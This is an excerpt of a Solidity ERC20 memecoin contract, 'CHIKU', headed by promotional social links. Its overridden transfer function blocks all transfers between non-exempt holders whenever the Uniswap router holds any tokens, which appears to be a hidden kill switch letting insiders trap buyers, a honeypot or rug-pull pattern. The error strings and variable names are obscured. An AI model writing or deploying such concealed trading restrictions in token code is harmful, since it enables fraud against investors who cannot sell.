...
$CHIKU
Shibu's New Chicken Friend
https://x.com/Fantoumi/status/1916189511312134458
https://x.com/search?q=%24CHIKU&src=typed_query&f=top
https://t.me/CHIKU_PORTAL
...
contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "1CHIKU");
        require(recipient != address(0), "2CHIKU");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "3CHIKU");
    ...
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "4CHIKU");
        require(spender != address(0), "5CHIKU");
...
contract CHIKU is ERC20 {
    ...
    constructor(address router) ERC20("Shibu's New Chicken Friend", "CHIKU", TOTAL_SUSUPPLYS) {
    ...
    function _transfer(address from, address to, uint256 amount) internal override {
        require(from != address(0), "6CHIKU");
        require(to != address(0), "7CHIKU");
        _checkLimitation(from, to, amount);
        if (amount == 0) {
            return;
        }
        if (!isException[from] && !isException[to]) {
            require(balanceOf(address(uniswapV2Router)) == 0, "8CHIKU");
        }
    ...
    function _checkLimitation(address from, address to, uint256 amount) internal {
        if (!hasLimit_) {
            if (!isException[from] && !isException[to]) {
                require(amount <= maxTxAmountbesomes, "9CHIKU");
                ...
                require(balanceOf(to) + amount <= maxwalletssetsomes, "0CHIKU");
            }
        }
    }
}